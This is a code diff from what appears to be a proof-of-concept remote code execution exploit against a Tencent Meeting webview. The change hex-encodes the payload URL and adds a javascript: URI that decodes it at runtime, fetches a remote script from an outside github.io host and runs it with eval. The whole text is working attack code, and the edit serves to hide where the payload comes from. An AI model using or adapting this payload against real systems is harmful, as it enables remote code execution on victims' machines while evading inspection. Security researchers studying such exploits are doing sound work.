@@ -9,9 +9,10 @@
 <script>
 document.title = 'P87-START';
 var official = 'https://meeting.tencent.com/v2/webview/keep-app-alive';
-var payloadUrl = 'https://gitwhs.github.io/wm-poc-rce/p87pay.js';
-var tbjs = 'javascript:void(fetch(' + JSON.stringify(payloadUrl)
-  + ').then(function(r){return r.text()}).then(eval))';
+var payloadHex = '68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7038377061792e6a73';
+var tbjs = "javascript:void(function(){var h='" + payloadHex
+  + "';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));"
+  + "fetch(u).then(function(r){return r.text()}).then(eval)})()";
 
 function frame(src, title) {
   document.title = title;
